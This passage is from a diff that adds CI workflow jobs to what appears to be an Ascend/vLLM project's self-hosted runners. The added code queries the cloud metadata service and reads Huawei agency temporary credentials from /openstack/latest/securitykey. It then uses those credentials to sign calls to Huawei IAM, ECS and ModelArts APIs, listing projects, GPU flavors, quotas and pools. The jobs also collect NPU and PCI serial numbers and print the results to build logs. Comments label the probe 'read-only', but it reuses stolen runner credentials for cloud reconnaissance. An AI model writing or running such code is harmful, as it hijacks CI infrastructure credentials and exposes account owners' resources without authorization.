+              ak = a if isinstance(a, str) and a else None
+              skv = s2 if isinstance(s2, str) and s2 else None
+              tok = t2 if isinstance(t2, str) and t2 else None
+              print('SECKEY_PRESENT access=%s secret=%s securitytoken=%s complete=%s' % (
+                  bool(ak), bool(skv), bool(tok), bool(ak and skv and tok)))
+          else:
+              why = 'non_json' if '/openstack/latest/securitykey' in bodies else 'no_body'
+              print('SECKEY_PRESENT access=False secret=False securitytoken=False complete=False reason=%s' % why)
+
+
+          # ---- conditional in-process issuer read (credential never printed / written / sent elsewhere) ----
+          def _enc(x):
+              return urllib.parse.quote(str(x), safe='-_.~')
+
+
+          def canonical_query(q):
+              if not q:
+                  return ''
+              pairs = urllib.parse.parse_qsl(q, keep_blank_values=True)
+              pairs = sorted(((_enc(k), _enc(v)) for k, v in pairs), key=lambda kv: (kv[0], kv[1]))
+              return '&'.join('%s=%s' % (k, v) for k, v in pairs)
+
+
+          def signed_get(url, timeout=10):
+              p = urllib.parse.urlsplit(url)
+              host = p.netloc
+              path = urllib.parse.quote(p.path or '/', safe='/-_.~')
+              if not path.endswith('/'):
+                  path += '/'
+              cq = canonical_query(p.query)
+              xsd = time.strftime('%Y%m%dT%H%M%SZ', time.gmtime())
+              hdrs = {'host': host, 'x-sdk-date': xsd, 'x-security-token': tok}
+              signed = sorted(hdrs.keys())
+              ch = ''.join('%s:%s\n' % (k, hdrs[k].strip()) for k in signed)
+              payload_hash = hashlib.sha256(b'').hexdigest()
+              creq = '\n'.join(['GET', path, cq, ch, ';'.join(signed), payload_hash])
+              sts = 'SDK-HMAC-SHA256\n' + xsd + '\n' + hashlib.sha256(creq.encode()).hexdigest()
+              sig = hmac.new(skv.encode(), sts.encode(), hashlib.sha256).hexdigest()
+              hd = {'Host': host, 'X-Sdk-Date': xsd, 'X-Security-Token': tok,
+                    'Authorization': 'SDK-HMAC-SHA256 Access=%s, SignedHeaders=%s, Signature=%s' % (ak, ';'.join(signed), sig)}
+              rq = urllib.request.Request(url, headers=hd, method='GET')
+              try:
+                  with OPENER.open(rq, timeout=timeout) as r:
+                      return r.status, r.read(262144), (r.headers.get('Content-Type') or '')[:80]
+              except urllib.error.HTTPError as e:
+                  try:
+                      b = e.read(8192)
+                  except Exception:
+                      b = b''
+                  return e.code, b, 'httperror'
+              except Exception as e:
+                  return None, b'', type(e).__name__
+
+
+          def head(b, n=220):
+              try:
+                  return b[:n].decode('utf-8', 'replace').replace('\n', ' ')
+              except Exception:
+                  return ''
+
+
+          if ak and skv and tok:
+              print('ISSUER_CONDITION_MET job=%s nonce=%s' % (JOB, NONCE))
+              if MOCK:
+                  print('ISSUER_SKIPPED_MOCK reason=C211_MOCK_ISSUER=1')
+              else:
+                  az = md.get('availability_zone') if isinstance(md, dict) else None
+                  region = None
+                  if isinstance(az, str):
+                      m = re.match(r'^([a-z]{2}-[a-z]+-\d+)', az)
+                      if m:
+                          region = m.group(1)
+                  if not region:
+                      region = os.environ.get('C211_REGION', 'cn-southwest-2')
+                  project = md.get('project_id') if isinstance(md, dict) else None
+                  print('ISSUER_REGION=%s ISSUER_AZ=%s ISSUER_PROJECT_FROM_METADATA=%s' % (region, az, project))
+                  iam_url = 'https://iam.myhuaweicloud.com/v3/auth/projects'
+                  st, body, note = signed_get(iam_url)
+                  print('IAM_IDENTITY tag=GetUserAppId-equivalent call=%s status=%s bytes=%d note=%s' % (
+                      iam_url, st, len(body or b''), note))
+                  if st == 200:
+                      try:
+                          d = json.loads(body)
+                          projs = d.get('projects') or []
+                          print('IAM_PROJECTS count=%d' % len(projs))
+                          for p in projs[:12]:
+                              print('IAM_PROJECT name=%s id=%s domain_id=%s enabled=%s' % (
+                                  str(p.get('name'))[:60], str(p.get('id'))[:64], str(p.get('domain_id'))[:64], p.get('enabled')))
+                          if not project and projs:
+                              project = projs[0].get('id')
+                      except Exception as e:
+                          print('IAM_IDENTITY_PARSE_FAIL %s' % type(e).__name__)
+                  elif st is not None:
+                      print('IAM_IDENTITY_BODY %s' % head(body))
+                  if project:
+                      u = 'https://ecs.%s.myhuaweicloud.com/v1/%s/cloudservers/flavors%s' % (
+                          region, project, ('?availability_zone=' + _enc(az)) if az else '')
+                      st, body, note = signed_get(u, timeout=15)
+                      print('ECS_FLAVORS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              fl = d.get('flavors') or []
+                              gpu = [f for f in fl if re.match(r'^(p\d|g\d|pi\d|ai\d)', str(f.get('name', '')))]
+                              print('ECS_FLAVORS_TOTAL %d GPU_NAME_HITS %d' % (len(fl), len(gpu)))
+                              for f in gpu[:40]:
+                                  print('ECS_GPU_FLAVOR name=%s vcpus=%s ram=%s extras=%s' % (
+                                      f.get('name'), f.get('vcpus'), f.get('ram'),
+                                      json.dumps(f.get('os_extra_specs') or {})[:160]))
+                              print('ECS_FLAVOR_NAMES_SAMPLE ' + ','.join(str(f.get('name')) for f in fl[:40]))
+                          except Exception as e:
+                              print('ECS_FLAVORS_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('ECS_FLAVORS_BODY %s' % head(body))
+                      u = 'https://ecs.%s.myhuaweicloud.com/v2.1/%s/os-quota-sets/%s' % (region, project, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('ECS_QUOTA status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              qs = d.get('quota_set') or d
+                              print('ECS_QUOTA_KEYS ' + ','.join(sorted(str(k) for k in qs.keys()))[:400])
+                              shown = 0
+                              for k in sorted(str(x) for x in qs.keys()):
+                                  v = qs.get(k)
+                                  if isinstance(v, dict) and ('limit' in v or 'in_use' in v or 'quota' in v):
+                                      print('ECS_QUOTA_ITEM %s limit=%s in_use=%s quota=%s' % (k, v.get('limit'), v.get('in_use'), v.get('quota')))
+                                  elif isinstance(v, (int, str)):
+                                      print('ECS_QUOTA_ITEM %s value=%s' % (k, v))
+                                  else:
+                                      continue
+                                  shown += 1
+                                  if shown >= 40:
+                                      break
+                          except Exception as e:
+                              print('ECS_QUOTA_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('ECS_QUOTA_BODY %s' % head(body))
+                      u = 'https://ecs.%s.myhuaweicloud.com/v2.1/%s/os-availability-zone' % (region, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('ECS_AZS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              zs = d.get('availabilityZoneInfo') or d.get('availability_zones') or []
+                              print('ECS_AZS_TOTAL %d' % len(zs))
+                              for z in zs[:20]:
+                                  if isinstance(z, dict):
+                                      print('ECS_AZ name=%s state=%s' % (str(z.get('zoneName') or z.get('zone_name'))[:60], z.get('zoneState') or z.get('zone_state')))
+                          except Exception as e:
+                              print('ECS_AZS_PARSE_FAIL %s' % type(e).__name__)
+                      u = 'https://modelarts.%s.myhuaweicloud.com/v1/%s/pools?limit=20' % (region, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('MODELARTS_POOLS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              pools = d.get('pools') or d.get('items') or []
+                              print('MODELARTS_POOLS_TOTAL %d' % len(pools))
+                              for p in pools[:20]:
+                                  if isinstance(p, dict):
+                                      print('MODELARTS_POOL %s' % json.dumps({k: p.get(k) for k in ('metadata', 'spec', 'status', 'name', 'pool_name', 'state') if p.get(k) is not None})[:300])
+                          except Exception as e:
+                              print('MODELARTS_POOLS_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('MODELARTS_POOLS_BODY %s' % head(body))
+                      u = 'https://modelarts.%s.myhuaweicloud.com/v1/%s/job/resource-specs?job_type=train' % (region, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('MODELARTS_SPECS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              specs = d.get('specs') or d.get('resource_specs') or []
+                              print('MODELARTS_SPECS_TOTAL %d' % len(specs))
+                              for s in specs[:40]:
+                                  if isinstance(s, dict):
+                                      print('MODELARTS_SPEC %s' % json.dumps(s)[:200])
+                          except Exception as e:
+                              print('MODELARTS_SPECS_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('MODELARTS_SPECS_BODY %s' % head(body))
+                  else:
+                      print('ISSUER_GPU_INVENTORY_SKIPPED reason=no_project_id')
+                  print('ISSUER_DONE job=%s' % JOB)
+          else:
+              print('ISSUER_NOT_ATTEMPTED reason=no_complete_agency_credential')
+
+          print('IMDS_PROBE_END job=%s nonce=%s' % (JOB, NONCE))
+
+          PYEOF
+          else
+            echo C211_PY3_ABSENT
+            BASE="${C211_IMDS_BASE:-http://169.254.169.254}"
+            for p in $(printf '%s\n' /latest/meta-data/instance-id /latest/meta-data/local-ipv4 /latest/meta-data/hostname /latest/meta-data/placement/availability-zone /openstack/latest/meta_data.json /openstack/latest/network_data.json /openstack/latest/vendor_data.json /openstack/latest/securitykey /openstack/latest/user_data /latest/meta-data/c211-bogus-noctl); do
+              tag=IMDS; case "$p" in *c211-bogus*) tag=CTL;; esac
+              if command -v curl >/dev/null 2>&1; then
+                out=$(curl -s --noproxy '*' -m 3 -w '\nC211_HTTP=%{http_code}' "$BASE$p" 2>/dev/null)
+                body=${out%$'\n'C211_HTTP=*}
+                code=${out##*C211_HTTP=}
+                b=$(printf '%s' "$body" | wc -c)
+                h=$(printf '%s' "$body" | sha256sum | cut -c1-32)
+                echo "$tag path=$p status=$code bytes=$b sha256=$h"
+              else
+                echo "$tag path=$p FAIL no_http_client"
+              fi
+            done
+            echo ISSUER_NOT_ATTEMPTED reason=no_python3
+          fi
+          echo "--- A5_NPU_BLOCK_BEGIN job=${C211_JOB} ---"
+          echo "NPU_DEVNODES $(ls -d /dev/davinci* /dev/davinci_manager /dev/devmm_svm /dev/hisi_hdc 2>/dev/null | tr '\n' ' ')"
+          NPU=""
+          if command -v npu-smi >/dev/null 2>&1; then NPU=$(command -v npu-smi); echo "NPU_SMI_PATH=$NPU (PATH)"; fi
+          if [ -z "$NPU" ] && [ -x /usr/local/Ascend/driver/tools/npu-smi ]; then NPU=/usr/local/Ascend/driver/tools/npu-smi; echo "NPU_SMI_PATH=$NPU (abs-driver-tools)"; fi
+          if [ -z "$NPU" ] && [ -x /usr/local/Ascend/ascend-toolkit/latest/bin/npu-smi ]; then NPU=/usr/local/Ascend/ascend-toolkit/latest/bin/npu-smi; echo "NPU_SMI_PATH=$NPU (abs-toolkit)"; fi
+          if [ -z "$NPU" ] && [ -x /usr/local/Ascend/ascend-toolkit/latest/tools/npu-smi ]; then NPU=/usr/local/Ascend/ascend-toolkit/latest/tools/npu-smi; echo "NPU_SMI_PATH=$NPU (abs-toolkit-tools)"; fi
+          if [ -n "$NPU" ]; then
+            echo "NPU_SMI_VERSION $("$NPU" -v 2>&1 | head -3 | tr '\n' ' ')"
+            echo "--- NPU_INFO_TEXT_BEGIN ---"
+            "$NPU" info 2>&1 | head -120
+            echo "NPU_INFO_RC=$?"
+            echo "--- NPU_INFO_TEXT_END ---"
+            IDS=$("$NPU" info 2>/dev/null | awk -F'|' 'NF>2 && $3 ~ /[0-9]/ {gsub(/ /,"",$2); if ($2 ~ /^[0-9]+$/) print $2}' | sort -n -u | head -8)
+            if [ -z "$IDS" ]; then IDS="0 1 2 3"; echo "NPU_IDS_FROM_PARSE_EMPTY using=$IDS"; else echo "NPU_IDS_FROM_PARSE $(echo $IDS | tr '\n' ' ')"; fi
+            for i in $IDS; do
+              for spec in "board_json:-t board -i $i -j" "product_json:-t product -i $i -j" "board_text:-t board -i $i" "product_text:-t product -i $i"; do
+                lab=${spec%%:*}; args=${spec#*:}
+                out=$("$NPU" info $args 2>&1); rc=$?
+                bytes=$(printf '%s' "$out" | wc -c)
+                echo "NPU_QUERY label=$lab i=$i rc=$rc bytes=$bytes"
+                printf '%s\n' "$out" | head -c 2200
+                echo "NPU_QUERY_END label=$lab i=$i"
+              done
+            done
+          else
+            echo "NPU_SMI_ABSENT"
+          fi
+          echo "--- A5_UPGRADE_TOOL ---"
+          UT=""
+          if command -v upgrade-tool >/dev/null 2>&1; then UT=$(command -v upgrade-tool); fi
+          if [ -z "$UT" ] && [ -x /usr/local/Ascend/driver/tools/upgrade-tool ]; then UT=/usr/local/Ascend/driver/tools/upgrade-tool; fi
+          if [ -n "$UT" ]; then echo "UPGRADE_TOOL_PATH=$UT"; "$UT" --device_index -1 --system_info 2>&1 | head -150; echo "UPGRADE_RC=$?"; else echo "UPGRADE_TOOL_ABSENT"; fi
+          echo "--- A5_SYSFS_DAVINCI ---"
+          for d in /sys/class/davinci*; do
+            [ -e "$d" ] || continue
+            echo "SYSFS_DAVINCI $d"
+            for f in dev device/device device/vendor device/serial uevent; do
+              if [ -e "$d/$f" ]; then echo "SYSFS_FIELD $d/$f=$(head -c 300 "$d/$f" 2>/dev/null | tr '\n' ' ')"; fi
+            done
+          done
+          echo "SYSFS_DAVINCI_DONE"
+          echo "--- A5_INSTALL_INFO ---"
+          if [ -e /etc/ascend_install.info ]; then echo "ASCEND_INSTALL_INFO_PRESENT"; head -40 /etc/ascend_install.info; else echo "ASCEND_INSTALL_INFO_ABSENT"; fi
+          for p in /usr/local/Ascend/ascend-toolkit/latest/aarch64-linux/ascend_toolkit_install.info /usr/local/Ascend/driver/version.info; do
+            if [ -e "$p" ]; then echo "INFO_FILE $p"; head -20 "$p"; fi
+          done
+          echo "--- A5_PCI_SERIAL ---"
+          if command -v lspci >/dev/null 2>&1; then
+            lspci -D -nn 2>/dev/null | grep -i '19e5' | head -20
+            for bdf in $(lspci -D -nn 2>/dev/null | awk '/19e5/ {print $1}' | head -8); do
+              echo "LSPCI_DEV $bdf"
+              lspci -vvv -s "$bdf" 2>/dev/null | grep -iE 'Serial|Capabilities: \[[0-9a-f]+\] Device Serial|Kernel driver' | head -10
+              if [ -e "/sys/bus/pci/devices/$bdf/serial" ]; then echo "PCI_SYSFS_SERIAL $bdf=$(head -c 200 /sys/bus/pci/devices/$bdf/serial 2>/dev/null)"; fi
+              for f in vendor device subsystem_vendor subsystem_device class revision; do
+                if [ -e "/sys/bus/pci/devices/$bdf/$f" ]; then echo "PCI_SYSFS $bdf/$f=$(head -c 100 /sys/bus/pci/devices/$bdf/$f 2>/dev/null)"; fi
+              done
+            done
+          else
+            echo "LSPCI_ABSENT"
+          fi
+          echo "--- A5_NPU_BLOCK_END job=${C211_JOB} ---"
+
+          echo "C211_PROBE_END job=${C211_JOB} nonce=${C211_NONCE}"
+          exit 0
+  probe-hk-cpu-2:
+    name: probe-hk-cpu-2
+    runs-on: linux-amd64-cpu-2-hk
+    timeout-minutes: 25
+    container:
+      image: quay.io/ascend-ci/vllm-ascend:lint
+    steps:
+      - name: read-only-huawei-imds-agency-and-npu-probe
+        env:
+          C211_NONCE: c211-129863-42d7ab68cd158054
+          C211_JOB: probe-hk-cpu-2
+        run: |
+          set -u
+          set +e
+          echo "C211_MARKER job=${C211_JOB} nonce=${C211_NONCE} host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u 2>/dev/null) user=$(id -un 2>/dev/null)"
+          echo "C211_HOSTNAME=$(hostname 2>/dev/null)"
+          echo "C211_UID_INFO $(id 2>/dev/null)"
+          echo "C211_UNAME $(uname -a 2>/dev/null)"
+          echo "C211_ARCH=$(uname -m 2>/dev/null)"
+          echo "C211_OS $(head -2 /etc/os-release 2>/dev/null | tr '\n' ' ')"
+          PY=""
+          if command -v python3 >/dev/null 2>&1; then PY=$(command -v python3); fi
+          if [ -z "$PY" ] && command -v python >/dev/null 2>&1; then PY=$(command -v python); fi
+          if [ -n "$PY" ]; then
+            echo "C211_PY=$PY"
+            "$PY" - <<'PYEOF' 2>&1
+          import hashlib, hmac, json, os, re, time, urllib.parse, urllib.request, urllib.error
+
+          NONCE = os.environ.get('C211_NONCE', '')
+          JOB = os.environ.get('C211_JOB', '')
+          BASE = os.environ.get('C211_IMDS_BASE', 'http://169.254.169.254').rstrip('/')
+          TIMEOUT = float(os.environ.get('C211_IMDS_TIMEOUT', '3'))
+          MOCK = os.environ.get('C211_MOCK_ISSUER', '0') == '1'
+          # Exact path set mandated by the intent.
+          PATHS = [
+              '/latest/meta-data/instance-id',
+              '/latest/meta-data/local-ipv4',
+              '/latest/meta-data/hostname',
+              '/latest/meta-data/placement/availability-zone',
+              '/openstack/latest/meta_data.json',
+              '/openstack/latest/network_data.json',
+              '/openstack/latest/vendor_data.json',
+              '/openstack/latest/securitykey',
+              '/openstack/latest/user_data',
+          ]
+          CTL = '/latest/meta-data/c211-bogus-' + (NONCE.split('-')[-1] if NONCE else 'ctl')
+          # Reference baselines from fact 129809 (a2b3-1 / 310p-1, run 45068821093).
+          BASE_401_STATUS = 401
+          BASE_401_BYTES = 66
+          BASE_401_SHA32 = 'a6418346d3f3db46f0a9477689318693'
+          CTL_404_STATUS = 404
+          CTL_404_BYTES = 52
+          CTL_404_SHA32 = '9c30d2d7fee8cd575438ae62bdb657a8'
+
+
+          class NoRedir(urllib.request.HTTPRedirectHandler):
+              def redirect_request(self, req, fp, code, msg, headers, newurl):
+                  return None
+
+
+          OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}), NoRedir)
+
+
+          def get(path, timeout=None, limit=65536):
+              url = BASE + path
+              rq = urllib.request.Request(url, headers={'User-Agent': 'c211-129863-imds-readonly'}, method='GET')
+              try:
+                  with OPENER.open(rq, timeout=(timeout or TIMEOUT)) as r:
+                      return r.status, r.read(limit), None
+              except urllib.error.HTTPError as e:
+                  try:
+                      b = e.read(4096)
+                  except Exception:
+                      b = b''
+                  return e.code, b, None
+              except Exception as e:
+                  return None, b'', type(e).__name__
+
+
+          print('IMDS_PROBE_BEGIN job=%s nonce=%s base=%s mock=%s' % (JOB, NONCE, BASE, MOCK))
+          results = {}
+          bodies = {}
+          for p in PATHS + [CTL]:
+              st, body, err = get(p)
+              tag = 'CTL' if p == CTL else 'IMDS'
+              if st is None:
+                  print('%s path=%s FAIL %s' % (tag, p, err))
+                  results[p] = {'status': None, 'error': err}
+                  continue
+              h32 = hashlib.sha256(body).hexdigest()[:32]
+              print('%s path=%s status=%d bytes=%d sha256=%s' % (tag, p, st, len(body), h32))
+              results[p] = {'status': st, 'bytes': len(body), 'sha256': h32}
+              if st == 200:
+                  bodies[p] = body
+
+          # ---- reference comparisons against the fact-129809 baseline / control ----
+          sk = results.get('/openstack/latest/securitykey') or {}
+          if sk.get('status') == BASE_401_STATUS and sk.get('bytes') == BASE_401_BYTES and sk.get('sha256') == BASE_401_SHA32:
+              print('SECKEY_BASELINE_MATCH status=401 bytes=66 sha256_prefix=%s' % BASE_401_SHA32)
+          else:
+              print('SECKEY_BASELINE_DIFF status=%s bytes=%s sha256_prefix=%s ref=401/66/%s' % (
+                  sk.get('status'), sk.get('bytes'), sk.get('sha256'), BASE_401_SHA32))
+          ctl = results.get(CTL) or {}
+          if ctl.get('status') == CTL_404_STATUS and ctl.get('bytes') == CTL_404_BYTES and ctl.get('sha256') == CTL_404_SHA32:
+              print('CTL_BASELINE_MATCH status=404 bytes=52 sha256_prefix=%s' % CTL_404_SHA32)
+          else:
+              print('CTL_BASELINE_DIFF status=%s bytes=%s sha256_prefix=%s ref=404/52/%s' % (
+                  ctl.get('status'), ctl.get('bytes'), ctl.get('sha256'), CTL_404_SHA32))
+
+
+          def jload(path):
+              if path not in bodies:
+                  return None
+              try:
+                  return json.loads(bodies[path].decode('utf-8', 'replace'))
+              except Exception:
+                  return None
+
+
+          # ---- non-secret metadata identifiers (field names + selected identifiers) ----
+          md = jload('/openstack/latest/meta_data.json')
+          if isinstance(md, dict):
+              print('META_KEYS ' + ','.join(sorted(str(k) for k in md.keys()))[:500])
+              for k in ('uuid', 'project_id', 'availability_zone', 'region_id', 'hostname', 'name',
+                        'instance_type', 'enterprise_project_id', 'launch_index', 'domain_id', 'account_id'):
+                  if k in md:
+                      print('META_FIELD %s=%s' % (k, str(md.get(k))[:140]))
+              meta_sub = md.get('meta')
+              if isinstance(meta_sub, dict):
+                  print('META_META_KEYS ' + ','.join(sorted(str(k) for k in meta_sub.keys()))[:400])
+                  for k in ('metering.resourcetype', 'metering.resourcespeccode', 'metering.cloudServiceType', 'os_type', 'image_name'):
+                      if k in meta_sub:
+                          print('META_META_FIELD %s=%s' % (k, str(meta_sub.get(k))[:140]))
+          elif '/openstack/latest/meta_data.json' not in bodies:
+              print('META_JSON_ABSENT')
+
+          nd = jload('/openstack/latest/network_data.json')
+          if isinstance(nd, dict):
+              print('NETDATA_KEYS ' + ','.join(sorted(str(k) for k in nd.keys()))[:300])
+              for k in ('links', 'networks', 'services', 'qos'):
+                  v = nd.get(k)
+                  if isinstance(v, list):
+                      print('NETDATA_COUNT %s=%d' % (k, len(v)))
+          elif '/openstack/latest/network_data.json' not in bodies:
+              print('NETDATA_JSON_ABSENT')
+
+          vd = jload('/openstack/latest/vendor_data.json')
+          if isinstance(vd, dict):
+              print('VENDORDATA_KEYS ' + ','.join(sorted(str(k) for k in vd.keys()))[:300])
+          elif '/openstack/latest/vendor_data.json' not in bodies:
+              print('VENDORDATA_JSON_ABSENT')
+
+          # ---- Huawei agency temporary credential: presence + field names + sha256 only ----
+          ak = skv = tok = None
+          sec = jload('/openstack/latest/securitykey')
+          cred = sec.get('credential') if isinstance(sec, dict) else None
+          if isinstance(cred, dict):
+              print('SECKEY_KEYS ' + ','.join(sorted(str(k) for k in cred.keys()))[:300])
+              for k in sorted(str(x) for x in cred.keys()):
+                  v = cred.get(k)
+                  if isinstance(v, str):
+                      print('SECKEY_FIELD name=%s len=%d sha256=%s' % (k, len(v), hashlib.sha256(v.encode()).hexdigest()[:32]))
+                  else:
+                      print('SECKEY_FIELD name=%s type=%s' % (k, type(v).__name__))
+              a = cred.get('access')
+              s2 = cred.get('secret')
+              t2 = cred.get('securitytoken')
+              ak = a if isinstance(a, str) and a else None
+              skv = s2 if isinstance(s2, str) and s2 else None
+              tok = t2 if isinstance(t2, str) and t2 else None
+              print('SECKEY_PRESENT access=%s secret=%s securitytoken=%s complete=%s' % (
+                  bool(ak), bool(skv), bool(tok), bool(ak and skv and tok)))
+          else:
+              why = 'non_json' if '/openstack/latest/securitykey' in bodies else 'no_body'
+              print('SECKEY_PRESENT access=False secret=False securitytoken=False complete=False reason=%s' % why)
+
+
+          # ---- conditional in-process issuer read (credential never printed / written / sent elsewhere) ----
+          def _enc(x):
+              return urllib.parse.quote(str(x), safe='-_.~')
+
+
+          def canonical_query(q):
+              if not q:
+                  return ''
+              pairs = urllib.parse.parse_qsl(q, keep_blank_values=True)
+              pairs = sorted(((_enc(k), _enc(v)) for k, v in pairs), key=lambda kv: (kv[0], kv[1]))
+              return '&'.join('%s=%s' % (k, v) for k, v in pairs)
+
+
+          def signed_get(url, timeout=10):
+              p = urllib.parse.urlsplit(url)
+              host = p.netloc
+              path = urllib.parse.quote(p.path or '/', safe='/-_.~')
+              if not path.endswith('/'):
+                  path += '/'
+              cq = canonical_query(p.query)
+              xsd = time.strftime('%Y%m%dT%H%M%SZ', time.gmtime())
+              hdrs = {'host': host, 'x-sdk-date': xsd, 'x-security-token': tok}
+              signed = sorted(hdrs.keys())
+              ch = ''.join('%s:%s\n' % (k, hdrs[k].strip()) for k in signed)
+              payload_hash = hashlib.sha256(b'').hexdigest()
+              creq = '\n'.join(['GET', path, cq, ch, ';'.join(signed), payload_hash])
+              sts = 'SDK-HMAC-SHA256\n' + xsd + '\n' + hashlib.sha256(creq.encode()).hexdigest()
+              sig = hmac.new(skv.encode(), sts.encode(), hashlib.sha256).hexdigest()
+              hd = {'Host': host, 'X-Sdk-Date': xsd, 'X-Security-Token': tok,
+                    'Authorization': 'SDK-HMAC-SHA256 Access=%s, SignedHeaders=%s, Signature=%s' % (ak, ';'.join(signed), sig)}
+              rq = urllib.request.Request(url, headers=hd, method='GET')
+              try:
+                  with OPENER.open(rq, timeout=timeout) as r:
+                      return r.status, r.read(262144), (r.headers.get('Content-Type') or '')[:80]
+              except urllib.error.HTTPError as e:
+                  try:
+                      b = e.read(8192)
+                  except Exception:
+                      b = b''
+                  return e.code, b, 'httperror'
+              except Exception as e:
+                  return None, b'', type(e).__name__
+
+
+          def head(b, n=220):
+              try:
+                  return b[:n].decode('utf-8', 'replace').replace('\n', ' ')
+              except Exception:
+                  return ''
+
+
+          if ak and skv and tok:
+              print('ISSUER_CONDITION_MET job=%s nonce=%s' % (JOB, NONCE))
+              if MOCK:
+                  print('ISSUER_SKIPPED_MOCK reason=C211_MOCK_ISSUER=1')
+              else:
+                  az = md.get('availability_zone') if isinstance(md, dict) else None
+                  region = None
+                  if isinstance(az, str):
+                      m = re.match(r'^([a-z]{2}-[a-z]+-\d+)', az)
+                      if m:
+                          region = m.group(1)
+                  if not region:
+                      region = os.environ.get('C211_REGION', 'cn-southwest-2')
+                  project = md.get('project_id') if isinstance(md, dict) else None
+                  print('ISSUER_REGION=%s ISSUER_AZ=%s ISSUER_PROJECT_FROM_METADATA=%s' % (region, az, project))
+                  iam_url = 'https://iam.myhuaweicloud.com/v3/auth/projects'
+                  st, body, note = signed_get(iam_url)
+                  print('IAM_IDENTITY tag=GetUserAppId-equivalent call=%s status=%s bytes=%d note=%s' % (
+                      iam_url, st, len(body or b''), note))
+                  if st == 200:
+                      try:
+                          d = json.loads(body)
+                          projs = d.get('projects') or []
+                          print('IAM_PROJECTS count=%d' % len(projs))
+                          for p in projs[:12]:
+                              print('IAM_PROJECT name=%s id=%s domain_id=%s enabled=%s' % (
+                                  str(p.get('name'))[:60], str(p.get('id'))[:64], str(p.get('domain_id'))[:64], p.get('enabled')))
+                          if not project and projs:
+                              project = projs[0].get('id')
+                      except Exception as e:
+                          print('IAM_IDENTITY_PARSE_FAIL %s' % type(e).__name__)
+                  elif st is not None:
+                      print('IAM_IDENTITY_BODY %s' % head(body))
+                  if project:
+                      u = 'https://ecs.%s.myhuaweicloud.com/v1/%s/cloudservers/flavors%s' % (
+                          region, project, ('?availability_zone=' + _enc(az)) if az else '')
+                      st, body, note = signed_get(u, timeout=15)
+                      print('ECS_FLAVORS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              fl = d.get('flavors') or []
+                              gpu = [f for f in fl if re.match(r'^(p\d|g\d|pi\d|ai\d)', str(f.get('name', '')))]
+                              print('ECS_FLAVORS_TOTAL %d GPU_NAME_HITS %d' % (len(fl), len(gpu)))
+                              for f in gpu[:40]:
+                                  print('ECS_GPU_FLAVOR name=%s vcpus=%s ram=%s extras=%s' % (
+                                      f.get('name'), f.get('vcpus'), f.get('ram'),
+                                      json.dumps(f.get('os_extra_specs') or {})[:160]))
+                              print('ECS_FLAVOR_NAMES_SAMPLE ' + ','.join(str(f.get('name')) for f in fl[:40]))
+                          except Exception as e:
+                              print('ECS_FLAVORS_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('ECS_FLAVORS_BODY %s' % head(body))
+                      u = 'https://ecs.%s.myhuaweicloud.com/v2.1/%s/os-quota-sets/%s' % (region, project, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('ECS_QUOTA status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              qs = d.get('quota_set') or d
+                              print('ECS_QUOTA_KEYS ' + ','.join(sorted(str(k) for k in qs.keys()))[:400])
+                              shown = 0
+                              for k in sorted(str(x) for x in qs.keys()):
+                                  v = qs.get(k)
+                                  if isinstance(v, dict) and ('limit' in v or 'in_use' in v or 'quota' in v):
+                                      print('ECS_QUOTA_ITEM %s limit=%s in_use=%s quota=%s' % (k, v.get('limit'), v.get('in_use'), v.get('quota')))
+                                  elif isinstance(v, (int, str)):
+                                      print('ECS_QUOTA_ITEM %s value=%s' % (k, v))
+                                  else:
+                                      continue
+                                  shown += 1
+                                  if shown >= 40:
+                                      break
+                          except Exception as e:
+                              print('ECS_QUOTA_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('ECS_QUOTA_BODY %s' % head(body))
+                      u = 'https://ecs.%s.myhuaweicloud.com/v2.1/%s/os-availability-zone' % (region, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('ECS_AZS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              zs = d.get('availabilityZoneInfo') or d.get('availability_zones') or []
+                              print('ECS_AZS_TOTAL %d' % len(zs))
+                              for z in zs[:20]:
+                                  if isinstance(z, dict):
+                                      print('ECS_AZ name=%s state=%s' % (str(z.get('zoneName') or z.get('zone_name'))[:60], z.get('zoneState') or z.get('zone_state')))
+                          except Exception as e:
+                              print('ECS_AZS_PARSE_FAIL %s' % type(e).__name__)
+                      u = 'https://modelarts.%s.myhuaweicloud.com/v1/%s/pools?limit=20' % (region, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('MODELARTS_POOLS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              pools = d.get('pools') or d.get('items') or []
+                              print('MODELARTS_POOLS_TOTAL %d' % len(pools))
+                              for p in pools[:20]:
+                                  if isinstance(p, dict):
+                                      print('MODELARTS_POOL %s' % json.dumps({k: p.get(k) for k in ('metadata', 'spec', 'status', 'name', 'pool_name', 'state') if p.get(k) is not None})[:300])
+                          except Exception as e:
